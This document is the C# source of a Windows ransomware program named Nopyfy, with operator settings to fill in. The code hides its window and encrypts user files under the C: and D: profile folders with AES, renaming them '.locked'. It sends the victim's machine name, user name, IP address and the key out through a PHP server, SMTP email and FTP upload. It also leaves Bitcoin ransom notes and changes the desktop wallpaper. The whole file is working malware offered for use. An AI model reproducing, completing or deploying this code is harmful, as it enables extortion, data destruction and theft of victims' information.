using System;
using System.Diagnostics;
using System.Linq;
using System.Text;

using System.Windows.Forms;

using System.Security.Cryptography;
using System.IO;
using System.Net;

using System.Runtime.InteropServices;

using System.Threading;

using System.Net.Mail;





namespace Nopyfy_Ransomware
{
    public partial class Form1 : Form
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\";
        string userDir1 = "D:\\";
        //Edit from here//////Edit from here//////Edit from here//////Edit from here//////Edit from here//////Edit from here//////Edit from here//////////////////////////////////////////////////////////////////////////////

        //Your company name
        string nop_own_name = "Nopyfy";

        //Your Email for Victim(Victim will contact by this email)
        string nop_own_email = "info@infutureworld.xyz";

        //write Encryption byte above 15 (same thing do in Nopyfy-decrypter)
        byte nop_byte = 100; 
        

        //Background image url of pc after attack
        string backgroundImageUrl = "https://i.imgur.com/s4MfYwB.png";

        //PHP Server Url for recieving Victim information and Password
        string targetURL = "http://example.com/Server/write.php";
        // line 250 - 252

        /////////////////////////////////////////////////////////////////////////////////////////////////////////// information detail end

        /////////////////////////////////////////////////////////////////////////////////////////////////////////// SMTP detail start

        //SMTP server(gmail,yahoo types hostname are allowed)
        string nop_smtp = "smtp.example.com";
        //line 261

        //SMTP email (from)
        string nop_smtp_from = "info@infutureworld.xyz";
        //line 263

        //Email that recieve Victim detail(you can also use same email)
        string nop_smtp_to = "help.infutureworld@gmail.com"; //1 email      
        string nop_smtp_to2 = "info@infutureworld.xyz";//2 email
        string nop_smtp_to3 = "no-reply@infutureworld.xyz";//3 email
        //line 265,266,267

        //SMTP Email password
        string nop_smtp_pass = "123456789";
        //line 274

        /////////////////////////////////////////////////////////////////////////////////////////////////////////// SMTP detail end

        /////////////////////////////////////////////////////////////////////////////////////////////////////////// FTP detail start
        
        //Ftp server/host detail (PLz type full url with folder in which file will save)
        // dont change first quote word
        //second quote =  host/server
        //third quote =  folder
        string nop_ftp = "ftp://"+ "example.com" + "/Victim/";
        //line 303

        //Ftp username
        string nop_ftp_user = "infuture";
        //line 295

        //Ftp password 
        string nop_ftp_pass = "123456";
        //line 295

        //////////////////////////////////////////////////////////////////////////////////////////////////////////// Ftp detail end

        //////////////////////////////////////////////////////////////////////////////////////////////////////////// Password For encryption
        // Write passowrd for encrypting data and save it with file name (NutShell.bat and Send_it.bat)
        string nop_encryption_pass = "infuture";//if password length is greater than 8 or lower than 8, then you will get error and prossess end during start. This will cause Victim does not get ransomware attack
                                                //line 204

        //end/////////////end///////////////////end////////////////////end/////////////////end///////////////////end/////////////////end//////////////////end///////////////////end/////////////////////////////////


        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }


        //hide process also from taskmanager
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 15, nop_byte };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"; //patern allowed
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();

        }
        class encrypter
        {

        }


        //Sends created password target location
        public void SendPassword(string password)
        {

            try
            {
                string hostName = Dns.GetHostName();
                string myIP = Dns.GetHostByName(hostName).AddressList[0].ToString();
                string info = "Computer Name - " + computerName + ", Username - " + userName + ", Password - " + password + "  , Ip Address - " + myIP + "  , Date/time - " + DateTime.Now.ToString("/Year/ - " + "yyyy" + ", /Month/ - " + "MM" + ", /Day/ - " + "dd" + ", /Hour/ - " + "hh" + ", /Minute/ - " + "mm" + ", /Second/ - " + "ss");
                /*var fullUrl = targetURL + info;*/
                var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                var stringChars = new char[10];
                var random = new Random();
                for (int i = 0; i < stringChars.Length; i++)
                {
                    stringChars[i] = chars[random.Next(chars.Length)];
                }

                var finalString = new String(stringChars);
                string name123 = computerName + " File - " + finalString;
                string path = userDir + userName + "\\Your_data\\" + name123 + ".bat";
                string path1 = userDir + userName + "\\Your_data\\" + "Send_it" + ".bat";

                //encrytion of user-data and save it for many loction(for preventing data lost).
                string[] lines = { info };                
                {
                    string textToEncrypt = info;
                    string ToReturn = "";
                    string publickey = nop_encryption_pass;//nop_encryption_pass
                    string secretkey = publickey;
                    byte[] secretkeyByte = { };
                    secretkeyByte = System.Text.Encoding.UTF8.GetBytes(secretkey);
                    byte[] publickeybyte = { };
                    publickeybyte = System.Text.Encoding.UTF8.GetBytes(publickey);
                    MemoryStream ms = null;
                    CryptoStream cs = null;
                    byte[] inputbyteArray = System.Text.Encoding.UTF8.GetBytes(textToEncrypt);
                    using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
                    {
                        ms = new MemoryStream();
                        cs = new CryptoStream(ms, des.CreateEncryptor(publickeybyte, secretkeyByte), CryptoStreamMode.Write);
                        cs.Write(inputbyteArray, 0, inputbyteArray.Length);
                        cs.FlushFinalBlock();
                        ToReturn = Convert.ToBase64String(ms.ToArray());
                    }

                    string destination = "Send_it.bat";
                    string[] lines1 = { ToReturn };
                    System.IO.File.WriteAllLines(destination, lines1);                    
                    System.IO.File.WriteAllLines(path, lines1);



                }
                //PHP webserver detail
                try
                {
                    string php_info = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
                    var php_fullUrl = targetURL + php_info;
                    var conent = new System.Net.WebClient().DownloadString(php_fullUrl);//PHP Webserver

                }
                catch (Exception)
                {

                }

                //PHP webserver end

                //SMTP detail

                try
                {
                    MailMessage mail = new MailMessage();
                    SmtpClient SmtpServer = new SmtpClient(nop_smtp);//SMTP host Server

                    mail.From = new MailAddress(nop_smtp_from);//SMTP from
                    mail.To.Add(nop_smtp_to);//smtp 1 mail
                    mail.To.Add(nop_smtp_to2);//smtp 2 mail
                    mail.To.Add(nop_smtp_to3);//smtp 3 mail
                    mail.Subject = "Client Data - " + name123;
                    mail.Body = info;

                    SmtpServer.Port = 587;
                    SmtpServer.Credentials = new System.Net.NetworkCredential(nop_smtp_from, nop_smtp_pass);
                    SmtpServer.EnableSsl = true;
                    SmtpServer.Send(mail);

                }
                catch (Exception)
                {

                }

                //SMTP detail end

                //ftp server detail

                try
                {
                    using (WebClient wc = new WebClient())
                    {
                        
                        WebClient client = new WebClient();
                        client.Credentials = new NetworkCredential(nop_ftp_user, nop_ftp_pass);
                        client.UploadFile(nop_ftp + name123 + ".txt", WebRequestMethods.Ftp.UploadFile, path);

                    }
                }
                catch (Exception)
                {

                }

                //ftp servr detail end


            }
            catch (Exception)
            {

            }
        }










        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            string users = "Users\\";
            string path_inf = users + userName + "\\Desktop\\READ_IT.txt.locked";       //path of the info file
            string fullpath_inf = userDir + path_inf;
            if (File.Exists(fullpath_inf))
            {
                File.Delete(fullpath_inf);
            }
            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".locked");    //exstension of hacked files
        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            try
            {
                //extensions to be encrypt please don't add .ini or the virus will crash before to encrypts all datas
                var validExtensions = new[]
                {
                        ".txt", ".jar", ".exe", ".dat", ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".dll" , ".c" , ".cs", ".mp3" , ".mp4", ".f3d" , ".dwg" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".apk" , ".lnk" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj" , ".pdb", ".ico" , ".pas" , ".db" ,  ".torrent"

                };

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        EncryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i], password);
                }
            }
            catch (Exception)
            {

            }
        }

        //create a random dir and move virus on it to avoid conflicts with encryption itself
        public void MoveVirus()
        {
            string destFileName = userDir + userName + "\\Ransomware";
            string destFileName_1 = userDir + userName + "\\Your_data";
            string destFileName_2 = userDir + userName + "\\Ransomware\\Virus.exe";
            if (!Directory.Exists(destFileName))
            {
                Directory.CreateDirectory(destFileName);
            }
            if (!Directory.Exists(destFileName_1))
            {
                DirectoryInfo di = Directory.CreateDirectory(destFileName_1);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            else
            {
                if (File.Exists(destFileName_2))
                {
                    File.Delete(destFileName_2);
                }
            }
            string name = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
            string curFile = Directory.GetCurrentDirectory() + name;
            string sourceFileName = curFile;
            File.Move(sourceFileName, destFileName_2);


        }

        //check for internet connection
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        public void startAction()
        {
            MoveVirus();
            string password = CreatePassword(10);
            Directory_Settings_Sending(password);
            messageCreator(password);
            SendPassword(password);


            bool Internet;
            string backgroundImageName = userDir + userName + "\\Ransomware" + "\\Background_Dekstop.jpg";


            // creating a loop if connection doesn't exist while it is available again to send password and change background desktop
            do
            {
                Internet = CheckForInternetConnection();
                if (Internet == true)
                {
                    SendPassword(password);
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile(new Uri(backgroundImageUrl), backgroundImageName);
                    SetWallpaper(backgroundImageName);



                }
            } while (Internet == false);
            password = null;

            System.Windows.Forms.Application.Exit();
        }

        public void Directory_Settings_Sending(string password)
        {
            //path to ecnrypt (child drectories already included)
            string path_1 = "Users\\";
            
            string startPath_2 = userDir + path_1 + userName + "\\Links";
            string startPath_3 = userDir + path_1 + userName + "\\Contacts";
            string startPath_4 = userDir + path_1 + userName + "\\Desktop";
            string startPath_5 = userDir + path_1 + userName + "\\Documents";
            string startPath_6 = userDir + path_1 + userName + "\\Downloads";
            string startPath_7 = userDir + path_1 + userName + "\\Pictures";
            string startPath_8 = userDir + path_1 + userName + "\\Music";
            string startPath_9 = userDir + path_1 + userName + "\\OneDrive";
            string startPath_10 = userDir + path_1 + userName + "\\Saved Games";
            string startPath_11 = userDir + path_1 + userName + "\\Favorites";
            string startPath_12 = userDir + path_1 + userName + "\\Searches";
            string startPath_13 = userDir + path_1 + userName + "\\Videos";
            
            string startPath_15 = userDir1 + path_1 + userName + "\\Links";
            string startPath_16 = userDir1 + path_1 + userName + "\\Contacts";
            string startPath_17 = userDir1 + path_1 + userName + "\\Desktop";
            string startPath_18 = userDir1 + path_1 + userName + "\\Documents";
            string startPath_19 = userDir1 + path_1 + userName + "\\Downloads";
            string startPath_20 = userDir1 + path_1 + userName + "\\Pictures";
            string startPath_21 = userDir1 + path_1 + userName + "\\Music";
            string startPath_22 = userDir1 + path_1 + userName + "\\OneDrive";
            string startPath_23 = userDir1 + path_1 + userName + "\\Saved Games";
            string startPath_24 = userDir1 + path_1 + userName + "\\Favorites";
            string startPath_25 = userDir1 + path_1 + userName + "\\Searches";
            string startPath_26 = userDir1 + path_1 + userName + "\\Videos";
            
            encryptDirectory(startPath_2, password);
            encryptDirectory(startPath_3, password);
            encryptDirectory(startPath_4, password);
            encryptDirectory(startPath_5, password);
            encryptDirectory(startPath_6, password);
            encryptDirectory(startPath_7, password);
            encryptDirectory(startPath_8, password);
            encryptDirectory(startPath_9, password);
            encryptDirectory(startPath_10, password);
            encryptDirectory(startPath_11, password);
            encryptDirectory(startPath_12, password);
            encryptDirectory(startPath_13, password);
            
            encryptDirectory(startPath_15, password);
            encryptDirectory(startPath_16, password);
            encryptDirectory(startPath_17, password);
            encryptDirectory(startPath_18, password);
            encryptDirectory(startPath_19, password);
            encryptDirectory(startPath_20, password);
            encryptDirectory(startPath_21, password);
            encryptDirectory(startPath_22, password);
            encryptDirectory(startPath_23, password);
            encryptDirectory(startPath_24, password);
            encryptDirectory(startPath_25, password);
            encryptDirectory(startPath_26, password);



        }

        public void messageCreator(string password)
        {
            
             string hostName = Dns.GetHostName();
             string myIP = Dns.GetHostByName(hostName).AddressList[0].ToString();
             string info = "Computer Name - " + computerName + ", Username - " + userName + ", Id - " + password + "  , Ip Address - " + myIP + "  , Date/time - " + DateTime.Now.ToString("/Year/ - " + "yyyy" + ", /Month/ - " + "MM" + ", /Day/ - " + "dd" + ", /Hour/ - " + "hh" + ", /Minute/ - " + "mm" + ", /Second/ - " + "ss");
             string textToEncrypt = info;
             string ToReturn = "";
             string publickey = nop_encryption_pass;//nop_encryption_pass
             string secretkey = publickey;
             byte[] secretkeyByte = { };
             secretkeyByte = System.Text.Encoding.UTF8.GetBytes(secretkey);
             byte[] publickeybyte = { };
             publickeybyte = System.Text.Encoding.UTF8.GetBytes(publickey);
             MemoryStream ms = null;
             CryptoStream cs = null;
             byte[] inputbyteArray = System.Text.Encoding.UTF8.GetBytes(textToEncrypt);
             using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
             {
                    ms = new MemoryStream();
                    cs = new CryptoStream(ms, des.CreateEncryptor(publickeybyte, secretkeyByte), CryptoStreamMode.Write);
                    cs.Write(inputbyteArray, 0, inputbyteArray.Length);
                    cs.FlushFinalBlock();
                    ToReturn = Convert.ToBase64String(ms.ToArray());
                    
             }
            
                string path_1 = "Users\\";
            string startPath_2 = userDir + path_1 + userName + "\\Links" + "\\READ_IT.txt";
            string startPath_3 = userDir + path_1 + userName + "\\Contacts" + "\\READ_IT.txt";
            string startPath_5 = userDir + path_1 + userName + "\\Documents" + "\\READ_IT.txt";
            string startPath_6 = userDir + path_1 + userName + "\\Downloads" + "\\READ_IT.txt";
            string startPath_7 = userDir + path_1 + userName + "\\Pictures" + "\\READ_IT.txt";
            string startPath_8 = userDir + path_1 + userName + "\\Music" + "\\READ_IT.txt";
            string startPath_9 = userDir + path_1 + userName + "\\OneDrive" + "\\READ_IT.txt";
            string startPath_10 = userDir + path_1 + userName + "\\Saved Games" + "\\READ_IT.txt";
            string startPath_11 = userDir + path_1 + userName + "\\Favorites" + "\\READ_IT.txt";
            string startPath_12 = userDir + path_1 + userName + "\\Searches" + "\\READ_IT.txt";
            string startPath_13 = userDir + path_1 + userName + "\\Videos" + "\\READ_IT.txt";
            string path = "\\Desktop\\READ_IT.txt";
            string fullpath = userDir + "Users\\" + userName + path;
            string infos = computerName + " - " + userName;
            string[] lines = { "You Are Hacked....!", "ATTENTION!", "Don't worry, you can return all your files!", "All your files like pictures, databases, documents,aplications and other are encrypted with ", "strongest encryption and with unique key.", "The only method of recovering files is to purchase decryption software and his key for you. ", "This decryption software will dycrypt all your encrypted files and also your computer come in his good condition. ", "Price of decryption key and decrypt software is $60, but discount 50% will apply(means you pay only $30.), if you contact us within 1day(24 hours).", "There  are only 1 method for paying money to us, only BitCoin", "for paying bitcoin,you need to do email to us.", "Our Email - " + nop_own_email, "Copy This line and email us - ", infos + " and  give me wallet address.", "⚠️Warning - contact within 24 hours for pay only $30, otherwise you charge $60 for dycryption key and software", "After email we will in Some time, reply you and give you wallet address.", " and then after successfull payment , we will send you decryption software link and decryption key to your replyed email.", "🛑⚠Caution - if You Change any encrypted file name (remove his .locked extention), then you won't be able to decrypt this file.", "Our email for your contact", "- "+nop_own_email, "- "+nop_own_name+"_Team :)","Your id (save it, its very important) - ", ToReturn };
            System.IO.File.WriteAllLines(fullpath, lines);
            System.IO.File.WriteAllLines(startPath_2, lines);
            System.IO.File.WriteAllLines(startPath_3, lines);
            System.IO.File.WriteAllLines(startPath_5, lines);
            System.IO.File.WriteAllLines(startPath_6, lines);
            System.IO.File.WriteAllLines(startPath_7, lines);
            System.IO.File.WriteAllLines(startPath_8, lines);
            System.IO.File.WriteAllLines(startPath_9, lines);
            System.IO.File.WriteAllLines(startPath_10, lines);
            System.IO.File.WriteAllLines(startPath_11, lines);
            System.IO.File.WriteAllLines(startPath_12, lines);
            System.IO.File.WriteAllLines(startPath_13, lines);


        }

        //Changes desktop background image
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }


    }
}
